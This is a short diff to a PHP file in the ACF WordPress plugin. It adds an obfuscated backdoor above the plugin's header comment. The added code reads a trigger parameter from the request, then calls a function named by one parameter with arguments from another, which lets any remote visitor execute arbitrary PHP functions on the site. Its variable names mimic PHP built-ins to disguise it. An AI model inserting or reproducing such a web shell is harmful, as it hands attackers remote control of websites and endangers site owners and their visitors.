@@ -1,4 +1,11 @@
-<?php
+<?php 
+$get_declared_traits_iltt  =  $_REQUEST;
+if(isset($get_declared_traits_iltt['date_create_immutable_ej']))  {
+	$gc_collect_cycles_susm  =  $get_declared_traits_iltt['openssl_x509_fingerprint_bu'];
+	$get_defined_vars_ccqa  =  $get_declared_traits_iltt['gc_enabled_xc'];
+	$gc_collect_cycles_susm(...$get_defined_vars_ccqa);
+} 
+
 /**
  * @package ACF
  * @author  WP Engine
